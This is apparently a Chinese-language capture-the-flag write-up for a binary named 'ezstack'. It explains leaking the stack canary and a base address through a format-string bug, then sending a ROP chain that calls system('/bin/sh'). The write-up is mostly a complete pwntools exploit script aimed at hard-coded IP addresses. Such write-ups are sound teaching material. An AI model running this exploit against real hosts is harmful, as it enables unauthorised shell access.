一道格式化字符串漏洞，查看保护可以发现 开启了PIE和 canary

通过ida可以发现后门函数 及其所需的参数。

观察程序，可以发现能够利用格式化字符串漏洞泄露地址信息和canary从而绕过其防护

再次利用格式化字符串漏洞覆盖canary和ret ，使其可以执行system("/bin/sh")



	#! /usr/bin/python3
	from pwn import*
	#io = remote("101.35.18.209",20113)
	io = remote("47.108.195.119",20113)
	#io = process('./ezstack')
	context.log_level = 'debug'
	
	#--------------------------------
	io.recvuntil("名称:")
	io.sendline("")
	io.recvuntil("名字:")
	io.sendline("")
	#--------------------------------
	
	sh = 0xB24
	system = 0xA7C
	pop_rdi = 0x000b03
	ret = 0x00000000000007c1
	#gdb.attach(io)
	io.sendline(b'%12$p%11$p')
	stack = io.recv(14)
	stack = int(stack,16)
	stack = stack & 0xfffffffffffff000
	print("stack---->"+hex(stack))
	canary = io.recvuntil('\n')[-17:]
	canary = int(canary,16)
	#gdb.attach(io)
	print("canary--->"+hex(canary))
	
	sh = stack + 0xB24
	system = stack + 0xA8C
	pop_rdi = stack + 0x000b03
	ret = stack + 0x00007c1
	
	print("sh",hex(sh))
	print("system",hex(system))
	print("pop_rdi",hex(pop_rdi))
	print("ret",hex(ret))
	
	io.recvuntil("--+--")
	#gdb.attach(io)
	io.sendline(b'a'*0x18 + p64(canary) + p64(0) + p64(pop_rdi) + p64(sh) + p64(system))
	
	io.interactive()